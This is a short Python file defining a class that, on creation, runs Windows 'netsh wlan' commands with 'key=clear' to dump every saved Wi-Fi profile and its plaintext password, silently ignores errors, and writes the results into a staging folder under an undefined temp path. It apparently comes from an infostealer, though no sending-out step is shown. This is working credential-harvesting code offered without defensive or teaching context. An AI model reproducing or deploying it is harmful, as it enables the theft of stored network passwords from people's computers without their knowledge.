import os
import subprocess

class Wifi:
	def __init__(self):
		self.networks = {}
		self.get_networks()
		self.save_networks()


	def get_networks(self):
		try:
			output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
			profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
			
			for profile in profiles:
				if profile:
					self.networks[profile] = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
		except Exception:
			pass

	def save_networks(self):
		os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
		if self.networks:
			for network, info in self.networks.items():			
				with open(os.path.join(temp_path, "Wifi", f"{network}.txt"), "wb") as f:
					f.write(info.encode("utf-8"))
		else:
			with open(os.path.join(temp_path, "Wifi", "No Wifi Networks Found.txt"), "w") as f:
				f.write("No wifi networks found.")